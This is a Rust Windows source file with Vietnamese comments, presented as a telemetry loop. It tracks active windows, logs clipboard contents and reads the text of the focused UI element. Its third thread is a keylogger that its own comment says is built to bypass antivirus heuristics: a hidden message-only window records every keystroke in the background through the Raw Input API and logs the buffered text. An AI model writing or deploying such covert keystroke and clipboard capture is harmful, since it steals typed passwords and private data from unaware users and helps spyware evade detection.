use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicU32, Ordering};
use std::thread::sleep;
use std::time::Duration;
use tokio::task;
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{GetLastInputInfo, LASTINPUTINFO};
use windows_sys::Win32::System::SystemInformation::GetTickCount;

use crate::telemetry::window_tracker::get_active_window;
use crate::telemetry::clipboard::check_clipboard;
use crate::telemetry::accessibility::get_focused_element;
use crate::telemetry::state_machine::StateMachine;
use windows_sys::Win32::UI::Input::{
    GetRawInputData, RegisterRawInputDevices, HRAWINPUT, RAWINPUT, RAWINPUTDEVICE, RIDEV_INPUTSINK, RID_INPUT,
    RAWKEYBOARD
};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    DefWindowProcW, GetMessageW, RegisterClassW, MSG, WNDCLASSW,
    CreateWindowExW, HWND_MESSAGE, WM_INPUT,
};
use windows_sys::Win32::Foundation::{HWND, LPARAM, LRESULT, WPARAM};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

pub fn spawn_telemetry_loop(state: Arc<Mutex<StateMachine>>) {
    let current_apm = Arc::new(AtomicU32::new(0));
    
    // Thread đếm APM (Actions Per Minute)
    let apm_counter = current_apm.clone();
    task::spawn_blocking(move || {
        let mut last_tick = 0;
        let mut actions_this_minute = 0;
        let mut minute_start = std::time::Instant::now();
        
        loop {
            unsafe {
                let mut last_input = LASTINPUTINFO {
                    cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
                    dwTime: 0,
                };
                if GetLastInputInfo(&mut last_input) != 0 {
                    if last_input.dwTime != last_tick {
                        last_tick = last_input.dwTime;
                        actions_this_minute += 1;
                    }
                }
            }
            
            if minute_start.elapsed().as_secs() >= 60 {
                apm_counter.store(actions_this_minute, Ordering::Relaxed);
                actions_this_minute = 0;
                minute_start = std::time::Instant::now();
            }
            
            // Poll 20 lần 1 giây để bắt kịp tốc độ gõ phím nhanh
            sleep(Duration::from_millis(50));
        }
    });

    let state_for_window = state.clone();
    task::spawn_blocking(move || {
        let mut last_window = String::new();
        let mut last_clipboard = String::new();

        loop {
            // Enterprise Audit Phase 1.4: Tối ưu hiệu năng bằng Idle Detection
            #[cfg(not(test))]
            unsafe {
                let mut last_input = LASTINPUTINFO {
                    cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
                    dwTime: 0,
                };
                if GetLastInputInfo(&mut last_input) != 0 {
                    let current_tick = GetTickCount();
                    let idle_time_ms = current_tick.saturating_sub(last_input.dwTime);
                    
                    // Nếu user không làm gì trong 60 giây (idle), tạm ngưng quét để tiết kiệm Pin và CPU
                    if idle_time_ms > 60_000 {
                        sleep(Duration::from_secs(10));
                        continue; // Bỏ qua lượt quét này
                    }
                }
            }

            let mut window_or_clipboard_changed = false;

            // 1. Theo dõi Window
            if let Some(win) = get_active_window() {
                if win.title != last_window {
                    last_window = win.title.clone();
                    window_or_clipboard_changed = true;
                    if let Ok(state_lock) = state_for_window.lock() {
                        let apm = current_apm.load(Ordering::Relaxed);
                        let _ = state_lock.log_window_change(&last_window, win.process_id, apm);
                    }
                }
            }

            // 2. Theo dõi Clipboard
            if let Some(clip) = check_clipboard() {
                if clip.lineage_id != last_clipboard {
                    last_clipboard = clip.lineage_id.clone();
                    window_or_clipboard_changed = true; // Trạng thái màn hình có biến động
                    if let Ok(state_lock) = state_for_window.lock() {
                        let _ = state_lock.log_clipboard_event(&last_clipboard, &clip.content);
                    }
                }
            }

            // 3. Dynamic Polling: Chỉ gọi UIAutomation (Cực tốn tài nguyên COM) khi màn hình/clipboard vừa thay đổi
            if window_or_clipboard_changed {
                if let Some(focused) = get_focused_element() {
                    if let Ok(state_lock) = state_for_window.lock() {
                        let _ = state_lock.log_focused_text(&focused.name, &focused.text_value);
                    }
                }
            }

            // Chu kỳ 2 giây/lần
            sleep(Duration::from_secs(2));
        }
    });

    // Thread lắng nghe Keylogger qua Raw Input API (Bypass AV Heuristics)
    let state_for_keylogger = state.clone();
    task::spawn_blocking(move || {
        unsafe {
            let h_instance = GetModuleHandleW(std::ptr::null());
            let class_name: Vec<u16> = "MyDnaHiddenClass".encode_utf16().chain(std::iter::once(0)).collect();
            
            let wnd_class = WNDCLASSW {
                style: 0,
                lpfnWndProc: Some(hidden_window_proc),
                cbClsExtra: 0,
                cbWndExtra: 0,
                hInstance: h_instance,
                hIcon: std::ptr::null_mut(),
                hCursor: std::ptr::null_mut(),
                hbrBackground: std::ptr::null_mut(),
                lpszMenuName: std::ptr::null(),
                lpszClassName: class_name.as_ptr(),
            };
            
            RegisterClassW(&wnd_class);
            
            let hwnd = CreateWindowExW(
                0,
                class_name.as_ptr(),
                std::ptr::null(),
                0, 0, 0, 0, 0,
                std::ptr::null_mut(), // HWND_MESSAGE
                std::ptr::null_mut(),
                h_instance,
                std::ptr::null(),
            );

            let mut rid = RAWINPUTDEVICE {
                usUsagePage: 0x01, // HID_USAGE_PAGE_GENERIC
                usUsage: 0x06,     // HID_USAGE_GENERIC_KEYBOARD
                dwFlags: RIDEV_INPUTSINK, // Lắng nghe Background
                hwndTarget: hwnd,
            };

            if RegisterRawInputDevices(&mut rid, 1, std::mem::size_of::<RAWINPUTDEVICE>() as u32) == 0 {
                eprintln!("Failed to register Raw Input Device");
                return;
            }

            // Chia sẻ trạng thái xuống WindowProc
            let shared_state = Box::into_raw(Box::new(state_for_keylogger));
            windows_sys::Win32::UI::WindowsAndMessaging::SetWindowLongPtrW(
                hwnd,
                windows_sys::Win32::UI::WindowsAndMessaging::GWLP_USERDATA,
                shared_state as isize,
            );

            let mut msg: MSG = std::mem::zeroed();
            while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
                windows_sys::Win32::UI::WindowsAndMessaging::TranslateMessage(&msg);
                windows_sys::Win32::UI::WindowsAndMessaging::DispatchMessageW(&msg);
            }
        }
    });
}

unsafe extern "system" fn hidden_window_proc(hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    static mut BUFFER: String = String::new();

    if msg == WM_INPUT {
        let mut size: u32 = 0;
        let h_raw_input = lparam as HRAWINPUT;
        
        GetRawInputData(
            h_raw_input,
            windows_sys::Win32::UI::Input::RID_INPUT,
            std::ptr::null_mut(),
            &mut size,
            std::mem::size_of::<windows_sys::Win32::UI::Input::RAWINPUTHEADER>() as u32,
        );
        
        if size > 0 {
            let mut raw_data = vec![0u8; size as usize];
            if GetRawInputData(
                h_raw_input,
                windows_sys::Win32::UI::Input::RID_INPUT,
                raw_data.as_mut_ptr() as *mut _,
                &mut size,
                std::mem::size_of::<windows_sys::Win32::UI::Input::RAWINPUTHEADER>() as u32,
            ) > 0 {
                let raw: &RAWINPUT = &*(raw_data.as_ptr() as *const RAWINPUT);
                if raw.header.dwType == windows_sys::Win32::UI::Input::RIM_TYPEKEYBOARD {
                    let keyboard = &raw.data.keyboard;
                    // WM_KEYDOWN = 0
                    if keyboard.Message == windows_sys::Win32::UI::WindowsAndMessaging::WM_KEYDOWN {
                        let vk_code = keyboard.VKey;
                        // Chuyển Virtual Key sang Ký tự đơn giản
                        
                        let char_u32 = std::char::from_u32(vk_code as u32).unwrap_or(' ').to_string();
                        let char_lower = std::char::from_u32((vk_code + 32) as u32).unwrap_or(' ').to_string();
                        
                        let ch = match vk_code {
                            0x0D => " ", // Enter
                            0x20 => " ", // Space
                            0x30..=0x39 => char_u32.as_str(),
                            0x41..=0x5A => char_lower.as_str(),
                            _ => "",
                        };
                        
                        if !ch.is_empty() {
                            BUFFER.push_str(ch);
                        }

                        if BUFFER.len() > 50 || vk_code == 0x0D {
                            let state_ptr = windows_sys::Win32::UI::WindowsAndMessaging::GetWindowLongPtrW(
                                hwnd,
                                windows_sys::Win32::UI::WindowsAndMessaging::GWLP_USERDATA,
                            ) as *mut Arc<Mutex<StateMachine>>;
                            
                            if !state_ptr.is_null() && !BUFFER.trim().is_empty() {
                                if let Ok(state_lock) = (*state_ptr).lock() {
                                    let _ = state_lock.log_keystrokes(&BUFFER);
                                }
                            }
                            BUFFER.clear();
                        }
                    }
                }
            }
        }
    }

    DefWindowProcW(hwnd, msg, wparam, lparam)
}
